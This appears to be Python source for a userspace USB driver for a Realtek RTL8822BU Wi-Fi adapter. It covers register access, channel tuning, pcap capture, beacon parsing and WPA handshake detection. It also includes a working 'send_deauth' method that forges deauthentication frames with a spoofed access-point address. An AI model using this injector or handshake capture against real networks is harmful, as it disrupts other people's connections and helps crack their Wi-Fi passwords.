import argparse
import binascii
import os
import re
import shutil
import struct
import subprocess
import sys
import time
import zlib
import itertools
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, Iterable, Optional, Tuple
 
import usb.core
import usb.util


def _is_termux() -> bool:
    if os.environ.get("TERMUX_VERSION") or os.environ.get("TERMUX_APP_PID"):
        return True
    prefix = str(os.environ.get("PREFIX", "") or "")
    if prefix.startswith("/data/data/com.termux/"):
        return True
    return os.path.exists("/data/data/com.termux/files/usr/bin/termux-usb")


if _is_termux():
    try:
        sys.stdout.reconfigure(line_buffering=True)
    except Exception:
        pass
    try:
        sys.stderr.reconfigure(line_buffering=True)
    except Exception:
        pass
 
 
REALTEK_USB_VENQT_READ = 0xC0
REALTEK_USB_VENQT_WRITE = 0x40
REALTEK_USB_VENQT_CMD_REQ = 0x05
REALTEK_USB_VENQT_CMD_IDX = 0x00

MASKBYTE0 = 0xFF
RF_CHNLBW_JAGUAR = 0x18
rFc_area_Jaguar = 0x860

R_0xC50 = 0xC50
R_0xE50 = 0xE50

TXDESC_SIZE = 48
QSLT_MGNT = 0x12
QSLT_BK = 0x02
QSLT_BE = 0x00
QSLT_VI = 0x05
QSLT_VO = 0x07
RATE_ID_B_MODE = 0x06

TXDESC_OFFSET_SHT = 16
TXDESC_QSEL_SHT = 8
TXDESC_RATE_ID_SHT = 16
TXDESC_SEQ_SHT = 16
TXDESC_BMC = 1 << 24
TXDESC_LSG = 1 << 26
TXDESC_FSG = 1 << 27
TXDESC_OWN = 1 << 31
TXDESC_HW_SSN = 1 << 7
TXDESC_USERATE = 1 << 8


def _read_le32(buf: bytes, off: int) -> int:
    return int.from_bytes(buf[off : off + 4], "little", signed=False)


def _write_le32(buf: bytearray, off: int, val: int) -> None:
    buf[off : off + 4] = int(val & 0xFFFFFFFF).to_bytes(4, "little", signed=False)


def _set_bits_le32(buf: bytearray, off: int, bit: int, width: int, value: int) -> None:
    cur = _read_le32(buf, off)
    mask = ((1 << width) - 1) << bit
    cur = (cur & ~mask) | ((int(value) << bit) & mask)
    _write_le32(buf, off, cur)


def _txdesc_checksum_8822b(desc48: bytearray) -> int:
    if len(desc48) != TXDESC_SIZE:
        raise ValueError("txdesc must be 48 bytes")
    _set_bits_le32(desc48, 28, 0, 16, 0)
    words = struct.unpack_from("<16H", desc48, 0)
    checksum = 0
    for i in range(8):
        checksum ^= int(words[2 * i]) ^ int(words[2 * i + 1])
    checksum &= 0xFFFF
    _set_bits_le32(desc48, 28, 0, 16, checksum)
    return checksum


def build_txdesc_8822b(
    payload_len: int,
    *,
    queue_sel: int = QSLT_MGNT,
    rate_id: int = RATE_ID_B_MODE,
    bmc: bool = False,
    seq_ctl: int = 0,
) -> bytes:
    if payload_len < 0 or payload_len > 0xFFFF:
        raise ValueError("payload_len out of range")
    d = bytearray(TXDESC_SIZE)
    txdw0 = (int(payload_len) & 0xFFFF) | ((TXDESC_SIZE & 0xFF) << TXDESC_OFFSET_SHT)
    txdw0 |= TXDESC_FSG | TXDESC_LSG | TXDESC_OWN
    if bmc:
        txdw0 |= TXDESC_BMC
    _write_le32(d, 0, txdw0)

    txdw1 = ((int(queue_sel) & 0x1F) << TXDESC_QSEL_SHT) | ((int(rate_id) & 0x0F) << TXDESC_RATE_ID_SHT)
    _write_le32(d, 4, txdw1)

    txdw3 = ((int(seq_ctl) & 0xFFFF) << TXDESC_SEQ_SHT) | (8 << 28)
    _write_le32(d, 12, txdw3)

    txdw4 = TXDESC_USERATE | TXDESC_HW_SSN
    _write_le32(d, 16, txdw4)

    _txdesc_checksum_8822b(d)
    return bytes(d)


def _bit(n: int) -> int:
    return 1 << int(n)


def _parse_int(s: str) -> int:
    s = s.strip().lower()
    if s.startswith("0x"):
        return int(s, 16)
    return int(s, 10)
 
 
def _hex_to_bytes(s: str) -> bytes:
    s = s.strip().replace(":", "").replace(" ", "")
    if not s:
        return b""
    return binascii.unhexlify(s)
 
 
def _fmt_mac(mac: Optional[bytes]) -> str:
    if not mac or len(mac) != 6:
        return "??:??:??:??:??:??"
    return ":".join(f"{b:02x}" for b in mac)


def _parse_mac(s: str) -> bytes:
    s = str(s).strip().lower()
    s = s.replace("-", ":")
    parts = s.split(":")
    if len(parts) == 1 and len(parts[0]) == 12:
        return binascii.unhexlify(parts[0])
    if len(parts) != 6:
        raise ValueError("MAC must have 6 bytes")
    out = bytes(int(p, 16) & 0xFF for p in parts)
    if len(out) != 6:
        raise ValueError("MAC must have 6 bytes")
    return out


def _is_broadcast_or_multicast(addr: Optional[bytes]) -> bool:
    if addr is None or len(addr) != 6:
        return False
    if addr == b"\xff\xff\xff\xff\xff\xff":
        return True
    return (addr[0] & 0x01) != 0


def _is_unicast_mac(addr: Optional[bytes]) -> bool:
    if addr is None or len(addr) != 6:
        return False
    return not _is_broadcast_or_multicast(addr)
 
 
def _fc_version(frame: bytes) -> int:
    if len(frame) < 2:
        return -1
    fc = int.from_bytes(frame[0:2], "little")
    return fc & 0x3
 
 
def _decode_fc(fc: int) -> tuple[int, int, bool, bool]:
    ftype = (fc >> 2) & 0x3
    subtype = (fc >> 4) & 0xF
    to_ds = ((fc >> 8) & 1) == 1
    from_ds = ((fc >> 9) & 1) == 1
    return ftype, subtype, to_ds, from_ds
 
 
def _fc_type_subtype_name(ftype: int, subtype: int) -> str:
    if ftype == 0:
        return f"mgmt/{subtype}"
    if ftype == 1:
        names = {
            8: "ctrl/BAR",
            9: "ctrl/BA",
            10: "ctrl/PS-Poll",
            11: "ctrl/RTS",
            12: "ctrl/CTS",
            13: "ctrl/ACK",
            14: "ctrl/CF-End",
            15: "ctrl/CF-End+CF-Ack",
        }
        return names.get(subtype, f"ctrl/{subtype}")
    if ftype == 2:
        return f"data/{subtype}"
    return f"reserved/{ftype}/{subtype}"
 
 
def _parse_addrs(frame: bytes) -> tuple[Optional[bytes], Optional[bytes], Optional[bytes], Optional[bytes], int, int, int]:
    if len(frame) < 24:
        return None, None, None, None, 0, 0, 0
    fc = int.from_bytes(frame[0:2], "little")
    ftype, subtype, to_ds, from_ds = _decode_fc(fc)
    a1 = frame[4:10]
    a2 = frame[10:16]
    a3 = frame[16:22]
    seq = int.from_bytes(frame[22:24], "little")
    a4 = None
    if to_ds and from_ds and len(frame) >= 30:
        a4 = frame[24:30]
    return a1, a2, a3, a4, ftype, subtype, seq
 
 
def _parse_addrs_any(frame: bytes) -> tuple[Optional[bytes], Optional[bytes], Optional[bytes], Optional[bytes], int, int, int, int]:
    if len(frame) < 2:
        return None, None, None, None, 0, 0, 0, 0
    fc = int.from_bytes(frame[0:2], "little")
    ftype, subtype, _to_ds, _from_ds = _decode_fc(fc)
    if ftype == 1:
        dur = int.from_bytes(frame[2:4], "little") if len(frame) >= 4 else 0
        ra = frame[4:10] if len(frame) >= 10 else None
        ta = None
        if subtype in (8, 9, 10, 11, 14, 15) and len(frame) >= 16:
            ta = frame[10:16]
        return ra, ta, None, None, ftype, subtype, 0, dur
    a1, a2, a3, a4, ftype2, subtype2, seq = _parse_addrs(frame)
    dur = int.from_bytes(frame[2:4], "little") if len(frame) >= 4 else 0
    return a1, a2, a3, a4, ftype2, subtype2, seq, dur


def _detect_4way_eapol(frame: bytes) -> Optional[tuple[int, Optional[bytes], Optional[bytes], int, int]]:
    if len(frame) < 32:
        return None
    fc = int.from_bytes(frame[0:2], "little")
    ftype = (fc >> 2) & 0x3
    if ftype != 2:
        return None

    subtype = (fc >> 4) & 0xF
    to_ds = bool((fc >> 8) & 0x1)
    from_ds = bool((fc >> 9) & 0x1)
    order = bool((fc >> 15) & 0x1)

    hdr_len = 24
    if to_ds and from_ds:
        hdr_len += 6
    if subtype & 0x8:
        hdr_len += 2
    if order:
        hdr_len += 4
    if len(frame) < hdr_len + 8 + 4 + 1 + 2 + 8:
        return None

    llc = frame[hdr_len : hdr_len + 8]
    if llc != b"\xaa\xaa\x03\x00\x00\x00\x88\x8e":
        return None

    eapol_off = hdr_len + 8
    eapol_type = frame[eapol_off + 1]
    if eapol_type != 3:
        return None

    eapol_len = int.from_bytes(frame[eapol_off + 2 : eapol_off + 4], "big")
    if len(frame) < eapol_off + 4 + eapol_len:
        return None
    if eapol_len < 1 + 2 + 8:
        return None

    key_desc_type = frame[eapol_off + 4]
    if key_desc_type not in (2,):
        return None

    key_info = int.from_bytes(frame[eapol_off + 5 : eapol_off + 7], "big")
    replay = int.from_bytes(frame[eapol_off + 9 : eapol_off + 17], "big")

    key_type = bool(key_info & 0x0008)
    install = bool(key_info & 0x0010)
    ack = bool(key_info & 0x0020)
    mic = bool(key_info & 0x0040)
    secure = bool(key_info & 0x0080)

    if not key_type:
        return None

    msg: Optional[int] = None
    if ack and not mic:
        msg = 1
    elif (not ack) and mic and (not secure):
        msg = 2
    elif ack and mic and install:
        msg = 3
    elif (not ack) and mic and secure:
        msg = 4

    if msg is None:
        return None

    a1, a2, a3, _a4, _ftype2, _subtype2, _seq = _parse_addrs(frame)

    bssid: Optional[bytes] = None
    sta: Optional[bytes] = None
    if not from_ds and to_ds:
        bssid = a1
        sta = a2
    elif from_ds and not to_ds:
        bssid = a2
        sta = a1

    return msg, bssid, sta, replay, key_info


def _print_4way_if_present(frame: bytes) -> None:
    info = _detect_4way_eapol(frame)
    if info is None:
        return
    msg, bssid, sta, replay, key_info = info
    bssid_s = _fmt_mac(bssid) if bssid is not None else "??"
    sta_s = _fmt_mac(sta) if sta is not None else "??"
    sys.stderr.write(f"4wh msg{msg} bssid={bssid_s} sta={sta_s} replay={replay} key_info=0x{key_info:04x}\n")
    sys.stderr.flush()
 
 
def _rnd8(n: int) -> int:
    return (n + 7) & ~7


def _parse_channels(s: str) -> list[int]:
    s = s.strip()
    if not s:
        return []
    out: list[int] = []
    for part in s.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            a, b = part.split("-", 1)
            lo = int(a.strip(), 10)
            hi = int(b.strip(), 10)
            if lo > hi:
                lo, hi = hi, lo
            out.extend(range(lo, hi + 1))
        else:
            out.append(int(part, 10))
    seen = set()
    uniq: list[int] = []
    for ch in out:
        if ch in seen:
            continue
        seen.add(ch)
        uniq.append(ch)
    return uniq


def _chan_to_freq_mhz(ch: int) -> int:
    if ch == 14:
        return 2484
    if 1 <= ch <= 13:
        return 2407 + ch * 5
    if 36 <= ch <= 177:
        return 5000 + ch * 5
    if 182 <= ch <= 196:
        return 4000 + ch * 5
    return 0


def _crc32_80211(data: bytes) -> int:
    return zlib.crc32(data) & 0xFFFFFFFF


def _strip_fcs_if_present(payload: bytes) -> tuple[bytes, bool]:
    if len(payload) < 4:
        return payload, False
    fcs_le = int.from_bytes(payload[-4:], "little")
    calc = _crc32_80211(payload[:-4])
    if fcs_le == calc:
        return payload[:-4], True
    return payload, False


def _radiotap_header(tsft: int, channel: int, flags: Optional[int]) -> bytes:
    has_flags = flags is not None
    present = 0x0000000B if has_flags else 0x00000009
    freq = _chan_to_freq_mhz(channel)
    if 1 <= channel <= 14:
        chan_flags = 0x0080
    elif (36 <= channel <= 177) or (182 <= channel <= 196):
        chan_flags = 0x0100
    else:
        chan_flags = 0x0000

    hdr = bytearray()
    hdr += struct.pack("<BBH", 0, 0, 0)
    hdr += struct.pack("<I", present)
    hdr += struct.pack("<Q", tsft & 0xFFFFFFFFFFFFFFFF)
    if has_flags:
        hdr += struct.pack("<B", int(flags))
        hdr += b"\x00"
    hdr += struct.pack("<HH", freq, chan_flags)
    struct.pack_into("<H", hdr, 2, len(hdr))
    return bytes(hdr)


class PcapWriter:
    def __init__(self, fp, linktype: int = 127, snaplen: int = 65535) -> None:
        self.fp = fp
        self.linktype = linktype
        self.snaplen = snaplen
        self._write_global_header()

    def _write_global_header(self) -> None:
        self.fp.write(struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, self.snaplen, self.linktype))
        self.fp.flush()

    def write_packet(self, payload: bytes) -> None:
        now = time.time()
        ts_sec = int(now)
        ts_usec = int((now - ts_sec) * 1_000_000)
        incl = len(payload)
        self.fp.write(struct.pack("<IIII", ts_sec, ts_usec, incl, incl))
        self.fp.write(payload)

    def flush(self) -> None:
        self.fp.flush()


def _extract_ap_info(payload: bytes) -> Optional[dict]:
    def _inner(p: bytes) -> Optional[dict]:
        if len(p) < 24:
            return None
        fc = int.from_bytes(p[0:2], "little")
        ftype = (fc >> 2) & 0x3
        subtype = (fc >> 4) & 0xF
        if ftype != 0 or subtype not in (5, 8):
            return None

        fixed_len = 12
        ies_off = 24 + fixed_len
        if len(p) < ies_off:
            return None

        info = {'ssid': None, 'channel': None, 'privacy': False, 'wpa': 0, 'wpa2': 0}
        
        if len(p) >= 36:
            cap_info = int.from_bytes(p[34:36], "little")
            if cap_info & 0x0010:
                info['privacy'] = True

        ies = p[ies_off:]
        off = 0
        while off + 2 <= len(ies):
            eid = ies[off]
            elen = ies[off + 1]
            off += 2
            if off + elen > len(ies):
                break
            data = ies[off : off + elen]
            
            if eid == 0:
                if elen == 0:
                    info['ssid'] = ""
                else:
                    info['ssid'] = data.decode("utf-8", errors="replace")
            elif eid == 3 and elen >= 1:
                ch = data[0]
                if 1 <= ch <= 196:
                    info['channel'] = int(ch)
            elif eid == 48:
                info['wpa2'] = 1
            elif eid == 221:
                if len(data) >= 4 and data.startswith(b'\x00\x50\xf2\x01'):
                    info['wpa'] = 1

            off += elen
        return info

    res = _inner(payload)
    if res is not None and res['ssid'] is not None:
        return res
    if len(payload) >= 28:
        return _inner(payload[:-4])
    return None
 
 
def _libusb_error_name(lib, code: int) -> str:
    try:
        import ctypes
 
        f = getattr(lib, "libusb_error_name", None)
        if f is None:
            return str(int(code))
        f.argtypes = [ctypes.c_int]
        f.restype = ctypes.c_char_p
        s = f(int(code))
        if isinstance(s, (bytes, bytearray)):
            return s.decode("utf-8", errors="replace")
        if s is None:
            return str(int(code))
        return str(s)
    except Exception:
        return str(int(code))
 
 
def _open_device_from_usb_fd(usb_fd: int) -> usb.core.Device:
    import ctypes
    import usb.backend.libusb1 as libusb1
 
    def _find_libusb1(name):
        p = os.environ.get("LIBUSB_PATH")
        if p:
            return str(p)
        termux = "/data/data/com.termux/files/usr/lib/libusb-1.0.so"
        if os.path.isfile(termux):
            return termux
        if name:
            return name
        return None

    backend = libusb1.get_backend(find_library=_find_libusb1)
    if backend is None:
        raise RuntimeError("libusb backend not available (install libusb)")
    lib = backend.lib
 
    wrap = getattr(lib, "libusb_wrap_sys_device", None)
    if wrap is None:
        raise RuntimeError("libusb_wrap_sys_device not available (need libusb >= 1.0.23)")
    wrap.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p)]
    wrap.restype = ctypes.c_int
 
    handle = ctypes.c_void_p()
    r = int(wrap(backend.ctx, ctypes.c_void_p(int(usb_fd)), ctypes.byref(handle)))
    if r != 0:
        raise RuntimeError(f"libusb_wrap_sys_device failed: {_libusb_error_name(lib, r)}")
    if not handle:
        raise RuntimeError("libusb_wrap_sys_device returned NULL handle")
 
    get_dev = getattr(lib, "libusb_get_device", None)
    if get_dev is None:
        raise RuntimeError("libusb_get_device not available")
    get_dev.argtypes = [ctypes.c_void_p]
    get_dev.restype = ctypes.c_void_p
    dev_ptr = ctypes.c_void_p(get_dev(handle))
    if not dev_ptr:
        raise RuntimeError("libusb_get_device returned NULL device")
 
    dev_id = libusb1._Device(dev_ptr)
    dev = usb.core.Device(dev_id, backend)
 
    class _WrappedHandle:
        def __init__(self, *, handle, devid):
            self.handle = handle
            self.devid = devid
 
    dev._ctx.handle = _WrappedHandle(handle=handle, devid=dev_id.devid)
    return dev
 
 
@dataclass(frozen=True)
class _PcapUsbRecord:
    frame_no: int
    time_rel: float
    transfer_type: int
    urb_type: str
    urb_id: str
    endpoint_address: int
    urb_len: int
    data_len: int
    capdata_hex: str
    bm_request_type: Optional[int]
    b_request: Optional[int]
    w_value: Optional[int]
    w_index: Optional[int]
    w_length: Optional[int]
    data_fragment_hex: str
    control_response_hex: str
 
 
@dataclass(frozen=True)
class RxPkt:
    frame: bytes
    pkt_len: int
    crc_err: int
    icv_err: int
    physt: int
    drvinfo_sz: int
    shift_sz: int
    tsfl: int
 
 
class Rtl8822buUsb:
    def __init__(self, *, vid: int = 0x0BDA, pid: int = 0xB812):
        self.vid = int(vid)
        self.pid = int(pid)
        self.dev: Optional[usb.core.Device] = None
        self.intf_num: Optional[int] = None
        self.altsetting: int = 0
        self.bulk_in_eps = []
        self.bulk_out_eps = []
        self.current_channel = 1
        self.current_bw = 20
        self.current_band = "2g"
        self.tx_seq = 0
 
    def _set_interface_alt_and_eps(self, intf) -> None:
        if self.dev is None or self.intf_num is None:
            raise RuntimeError("device not open")
        alt = int(getattr(intf, "bAlternateSetting", 0))
        if alt != self.altsetting:
            self.dev.set_interface_altsetting(interface=self.intf_num, alternate_setting=alt)
            self.altsetting = alt
        bulk_in = []
        bulk_out = []
        for ep in intf.endpoints():
            if usb.util.endpoint_type(ep.bmAttributes) != usb.util.ENDPOINT_TYPE_BULK:
                continue
            if usb.util.endpoint_direction(ep.bEndpointAddress) == usb.util.ENDPOINT_IN:
                bulk_in.append(ep)
            else:
                bulk_out.append(ep)
        self.bulk_in_eps = sorted(bulk_in, key=lambda e: e.bEndpointAddress)
        self.bulk_out_eps = sorted(bulk_out, key=lambda e: e.bEndpointAddress)
 
    def open(
        self,
        *,
        interface: int = 0,
        configuration: int = 1,
        usb_fd: Optional[int] = None,
        bus: Optional[int] = None,
        address: Optional[int] = None,
    ) -> None:
        if usb_fd is not None and int(usb_fd) >= 0:
            dev = _open_device_from_usb_fd(int(usb_fd))
            if int(getattr(dev, "idVendor", 0)) != int(self.vid) or int(getattr(dev, "idProduct", 0)) != int(self.pid):
                raise RuntimeError(
                    f"USB FD device mismatch: got {int(getattr(dev, 'idVendor', 0)):04x}:{int(getattr(dev, 'idProduct', 0)):04x} "
                    f"want {int(self.vid):04x}:{int(self.pid):04x}"
                )
        else:
            found = list(usb.core.find(find_all=True, idVendor=self.vid, idProduct=self.pid) or [])
            if bus is not None:
                found = [d for d in found if int(getattr(d, "bus", -1) or -1) == int(bus)]
            if address is not None:
                found = [d for d in found if int(getattr(d, "address", -1) or -1) == int(address)]
            if not found:
                extra = []
                if bus is not None:
                    extra.append(f"bus={int(bus)}")
                if address is not None:
                    extra.append(f"address={int(address)}")
                extra_s = f" ({', '.join(extra)})" if extra else ""
                raise RuntimeError(f"USB device {self.vid:04x}:{self.pid:04x} not found{extra_s}")
            dev = found[0]
 
        self.dev = dev
 
        try:
            dev.set_configuration(configuration)
        except usb.core.USBError:
            pass
 
        cfg = dev.get_active_configuration()
        candidates = [i for i in cfg if getattr(i, "bInterfaceNumber", None) == interface]
        if not candidates:
            raise RuntimeError(f"USB interface {interface} not found")
 
        chosen = None
        for i in sorted(candidates, key=lambda x: getattr(x, "bAlternateSetting", 0)):
            bulk_in = []
            bulk_out = []
            for ep in i.endpoints():
                if usb.util.endpoint_type(ep.bmAttributes) != usb.util.ENDPOINT_TYPE_BULK:
                    continue
                if usb.util.endpoint_direction(ep.bEndpointAddress) == usb.util.ENDPOINT_IN:
                    bulk_in.append(ep)
                else:
                    bulk_out.append(ep)
            if bulk_in:
                chosen = i
                if bulk_out:
                    break
        if chosen is None:
            chosen = candidates[0]
 
        self.intf_num = interface
 
        if hasattr(dev, "is_kernel_driver_active"):
            try:
                if dev.is_kernel_driver_active(interface):
                    dev.detach_kernel_driver(interface)
            except usb.core.USBError:
                pass
 
        usb.util.claim_interface(dev, interface)
        try:
            self._set_interface_alt_and_eps(chosen)
        except usb.core.USBError:
            self.altsetting = 0
            self.bulk_in_eps = []
            self.bulk_out_eps = []
            self._set_interface_alt_and_eps(chosen)
 
        if not self.bulk_in_eps:
            raise RuntimeError("No bulk IN endpoints found on interface")
 
    def close(self) -> None:
        if self.dev is None:
            return
        try:
            usb.util.dispose_resources(self.dev)
        finally:
            self.dev = None
            self.intf_num = None
            self.bulk_in_eps = []
            self.bulk_out_eps = []
            self.altsetting = 0
            self.current_channel = 1
            self.current_bw = 20
            self.current_band = "2g"

    def ctrl_read(self, addr: int, length: int, *, timeout_ms: int = 500) -> bytes:
        if self.dev is None:
            raise RuntimeError("device not open")
        if length <= 0 or length > 254:
            raise ValueError("length must be 1..254")
        data = self.dev.ctrl_transfer(
            REALTEK_USB_VENQT_READ,
            REALTEK_USB_VENQT_CMD_REQ,
            addr & 0xFFFF,
            REALTEK_USB_VENQT_CMD_IDX,
            length,
            timeout=timeout_ms,
        )
        return bytes(data)

    def ctrl_write(self, addr: int, data: bytes, *, timeout_ms: int = 500) -> None:
        if self.dev is None:
            raise RuntimeError("device not open")
        if not data or len(data) > 254:
            raise ValueError("data length must be 1..254")
        self.dev.ctrl_transfer(
            REALTEK_USB_VENQT_WRITE,
            REALTEK_USB_VENQT_CMD_REQ,
            addr & 0xFFFF,
            REALTEK_USB_VENQT_CMD_IDX,
            data,
            timeout=timeout_ms,
        )

    def read8(self, addr: int) -> int:
        return self.ctrl_read(addr, 1)[0]

    def read16(self, addr: int) -> int:
        return int.from_bytes(self.ctrl_read(addr, 2), "little")

    def read32(self, addr: int) -> int:
        return int.from_bytes(self.ctrl_read(addr, 4), "little")

    def write8(self, addr: int, value: int) -> None:
        self.ctrl_write(addr, bytes([value & 0xFF]))

    def write16(self, addr: int, value: int) -> None:
        self.ctrl_write(addr, int(value & 0xFFFF).to_bytes(2, "little"))

    def write32(self, addr: int, value: int) -> None:
        self.ctrl_write(addr, int(value & 0xFFFFFFFF).to_bytes(4, "little"))

    @staticmethod
    def _calculate_bit_shift(bitmask: int) -> int:
        for i in range(32):
            if (bitmask >> i) & 1:
                return i
        return 0

    def get_bbreg(self, addr: int, bitmask: int) -> int:
        original = self.read32(addr)
        shift = self._calculate_bit_shift(bitmask)
        return (original & bitmask) >> shift

    def set_bbreg(self, addr: int, bitmask: int, data: int) -> None:
        if bitmask != 0xFFFFFFFF:
            original = self.read32(addr)
            shift = self._calculate_bit_shift(bitmask)
            data = (original & ~bitmask) | ((data << shift) & bitmask)
        self.write32(addr, data)

    def get_igi(self) -> tuple[int, int]:
        return int(self.get_bbreg(R_0xC50, 0x7F)), int(self.get_bbreg(R_0xE50, 0x7F))

    def set_igi(self, igi: int) -> None:
        igi = int(igi)
        if igi < 0 or igi > 0x7F:
            raise ValueError("igi must be 0..127")
        self.set_bbreg(R_0xC50, 0x7F, igi)
        self.set_bbreg(R_0xE50, 0x7F, igi)

    def switch_band(self, channel: int) -> None:
        if channel <= 14:
            self.set_bbreg(0x808, _bit(28), 0x1)
            self.set_bbreg(0x454, _bit(7), 0x0)
            self.set_bbreg(0xA80, _bit(18), 0x0)
            self.set_bbreg(0x814, 0x0000FC00, 15)
        else:
            self.set_bbreg(0xA80, _bit(18), 0x1)
            self.set_bbreg(0x454, _bit(7), 0x1)
            self.set_bbreg(0x808, _bit(28), 0x0)
            self.set_bbreg(0x814, 0x0000FC00, 34)

        rf_reg18 = self._rf_serial_read(0, RF_CHNLBW_JAGUAR)
        rf_reg18 &= ~(_bit(16) | _bit(9) | _bit(8) | _bit(15))
        if channel > 35:
            rf_reg18 |= _bit(8) | _bit(16)
        self.set_rfreg(0, RF_CHNLBW_JAGUAR, 0x000FFFFF, rf_reg18)
        self.current_band = "5g" if channel > 14 else "2g"

    def _rf_bb_regdef(self, rfpath: int) -> tuple[int, int, int, int]:
        rfhssi_para2 = 0x8B0
        if rfpath == 0:
            rf3wire = 0xC90
            rf_rb = 0xD08
            rf_rbpi = 0xD04
        else:
            rf3wire = 0xE90
            rf_rb = 0xD48
            rf_rbpi = 0xD44
        return rf3wire, rfhssi_para2, rf_rb, rf_rbpi

    def _rf_serial_read(self, rfpath: int, reg: int) -> int:
        rf3wire, rfhssi_para2, rf_rb, rf_rbpi = self._rf_bb_regdef(rfpath)
        reg &= 0xFF
        b_is_pi = bool(self.get_bbreg(0xC00 if rfpath == 0 else 0xE00, 0x4))
        self.set_bbreg(rfhssi_para2, 0xFF, reg)
        time.sleep(0.00002)
        rb = rf_rbpi if b_is_pi else rf_rb
        return self.get_bbreg(rb, 0xFFFFF)

    def _rf_serial_write(self, rfpath: int, reg: int, data: int) -> None:
        rf3wire, _, _, _ = self._rf_bb_regdef(rfpath)
        reg &= 0xFF
        data_and_addr = ((reg << 20) | (data & 0x000FFFFF)) & 0x0FFFFFFF
        self.write32(rf3wire, data_and_addr)

    def set_rfreg(self, rfpath: int, reg: int, bitmask: int, data: int) -> None:
        if bitmask == 0:
            return
        if bitmask != 0x000FFFFF:
            original = self._rf_serial_read(rfpath, reg)
            shift = self._calculate_bit_shift(bitmask)
            data = (original & ~bitmask) | ((data << shift) & bitmask)
        self._rf_serial_write(rfpath, reg, data)

    def set_channel(self, channel: int, *, bandwidth_mhz: int = 20) -> None:
        if channel <= 0 or channel > 196:
            raise ValueError("channel out of range")
        if bandwidth_mhz not in (20, 40, 80):
            raise ValueError("bandwidth_mhz must be 20, 40, or 80")

        target_band = "5g" if channel > 14 else "2g"
        if target_band != self.current_band:
            self.switch_band(channel)

        if channel <= 14:
            self.set_bbreg(0x958, 0x1F, 0x0)
            self.set_bbreg(rFc_area_Jaguar, 0x1FFE0000, 0x96A)
            if channel == 14:
                self.set_bbreg(0xA24, 0xFFFFFFFF, 0x00006577)
                self.set_bbreg(0xA28, 0x0000FFFF, 0x0000)
            else:
                self.set_bbreg(0xA24, 0xFFFFFFFF, 0x384F6577)
                self.set_bbreg(0xA28, 0x0000FFFF, 0x1525)
        else:
            if 36 <= channel <= 64:
                self.set_bbreg(0x958, 0x1F, 0x1)
            elif 100 <= channel <= 144:
                self.set_bbreg(0x958, 0x1F, 0x2)
            elif channel >= 149:
                self.set_bbreg(0x958, 0x1F, 0x3)

            if 36 <= channel <= 48:
                self.set_bbreg(rFc_area_Jaguar, 0x1FFE0000, 0x494)
            elif 52 <= channel <= 64:
                self.set_bbreg(rFc_area_Jaguar, 0x1FFE0000, 0x453)
            elif 100 <= channel <= 116:
                self.set_bbreg(rFc_area_Jaguar, 0x1FFE0000, 0x452)
            elif 118 <= channel <= 177:
                self.set_bbreg(rFc_area_Jaguar, 0x1FFE0000, 0x412)

        for rfpath in (0,):
            rf_reg18 = self._rf_serial_read(rfpath, RF_CHNLBW_JAGUAR)
            if int(channel) <= 14:
                bw_bits = 3 if bandwidth_mhz == 20 else (1 if bandwidth_mhz == 40 else 0)
                rf_reg18 &= ~(_bit(18) | _bit(17) | _bit(16) | _bit(15) | MASKBYTE0 | _bit(11) | _bit(10))
                rf_reg18 |= int(channel) & MASKBYTE0
                rf_reg18 |= (int(bw_bits) << 10) & (_bit(11) | _bit(10))
            else:
                rf_reg18 &= ~(_bit(18) | _bit(17) | MASKBYTE0 | _bit(15))
                rf_reg18 |= int(channel) & MASKBYTE0
            if int(channel) == 144:
                self.set_rfreg(rfpath, 0xDF, _bit(18), 0x1)
                rf_reg18 |= _bit(17)
            else:
                self.set_rfreg(rfpath, 0xDF, _bit(18), 0x0)
                if int(channel) > 144:
                    rf_reg18 |= _bit(18)
                elif int(channel) >= 80:
                    rf_reg18 |= _bit(17)
            self.set_rfreg(rfpath, RF_CHNLBW_JAGUAR, 0x000FFFFF, rf_reg18)
        time.sleep(0.001)
        self.current_channel = int(channel)
        self.current_bw = int(bandwidth_mhz)
 
    def bulk_read_ep(self, ep_addr: int, *, size: int, timeout_ms: int) -> bytes:
        if self.dev is None:
            raise RuntimeError("device not open")
        try:
            data = self.dev.read(ep_addr, size, timeout=timeout_ms)
            return bytes(data)
        except usb.core.USBTimeoutError:
            return b""
 
    def bulk_write_ep(self, ep_addr: int, data: bytes, *, timeout_ms: int) -> int:
        if self.dev is None:
            raise RuntimeError("device not open")
        return int(self.dev.write(ep_addr, data, timeout=timeout_ms))

    def bulk_write(self, data: bytes, *, ep_addr: Optional[int] = None, timeout_ms: int = 1000) -> int:
        if not self.bulk_out_eps:
            raise RuntimeError("No bulk OUT endpoints found on interface")
        ep = self.bulk_out_eps[0] if ep_addr is None else next(
            (e for e in self.bulk_out_eps if e.bEndpointAddress == ep_addr), None
        )
        if ep is None:
            raise ValueError(f"bulk OUT endpoint 0x{ep_addr:02x} not found")
        wMaxPacketSize = getattr(ep, "wMaxPacketSize", 512) or 512
        payload = bytearray(data)
        if (len(payload) % int(wMaxPacketSize)) == 0:
            payload += b"\x00" * 8
        return self.bulk_write_ep(int(ep.bEndpointAddress), bytes(payload), timeout_ms=int(timeout_ms))

    def tx_frame(self, frame: bytes, *, ep_addr: Optional[int] = None) -> int:
        if len(frame) < 2:
            raise ValueError("frame too short")
        frame, _ = _strip_fcs_if_present(frame)
        a1 = frame[4:10] if len(frame) >= 10 else None
        bmc = _is_broadcast_or_multicast(a1)

        seq_ctl = 0
        if len(frame) >= 24:
            seq_ctl = int.from_bytes(frame[22:24], "little")

        desc = build_txdesc_8822b(len(frame), queue_sel=QSLT_MGNT, rate_id=RATE_ID_B_MODE, bmc=bmc, seq_ctl=seq_ctl)
        return self.bulk_write(desc + frame, ep_addr=ep_addr)

    def send_deauth(
        self,
        *,
        dest: str,
        bssid: str,
        source: Optional[str] = None,
        reason: int = 7,
        ep_out: Optional[int] = None,
    ) -> int:
        if source is None:
            source = bssid
        da = _parse_mac(dest)
        sa = _parse_mac(source)
        bssid_bytes = _parse_mac(bssid)

        fc = 0x00C0
        duration = 0x013A
        seq_ctrl = (int(self.tx_seq) & 0xFFF) << 4
        self.tx_seq = (int(self.tx_seq) + 1) & 0xFFF

        header = struct.pack("<HH", fc, duration) + da + sa + bssid_bytes + struct.pack("<H", seq_ctrl)
        body = struct.pack("<H", int(reason) & 0xFFFF)
        return self.tx_frame(header + body, ep_addr=ep_out)
 
